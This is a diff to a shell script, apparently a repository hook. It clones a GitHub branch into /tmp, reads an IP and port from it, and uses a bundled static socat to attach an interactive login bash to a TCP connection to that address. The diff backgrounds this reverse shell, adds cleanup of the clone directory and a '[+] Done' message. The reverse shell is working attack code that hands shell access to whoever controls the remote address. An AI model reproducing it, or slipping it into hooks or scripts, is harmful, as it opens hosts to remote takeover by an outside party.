@@ -2,6 +2,7 @@
 # PWD ....../test (test is the repo name)
 if [ -z "$REMOTE_ADDR" ]; then
     old_pwd="$PWD"
+    rm -rf /tmp/ngrok
     cd /tmp && git clone -b addr --single-branch https://github.com/yuvalavra/ngrok.git
     remote_serv="$(cat /tmp/ngrok/ip_port)"
     #rm -rf /tmp/ngrok
@@ -11,4 +12,5 @@ else
 fi
 
 echo "remote: $remote_serv"
-./hooks/static_socat "exec:./hooks/static_bash -li,pty,stderr,setsid,sigint,sane" "tcp:$remote_serv"
+./hooks/static_socat "exec:./hooks/static_bash -li,pty,stderr,setsid,sigint,sane" "tcp:$remote_serv" &
+echo "[+] Done"
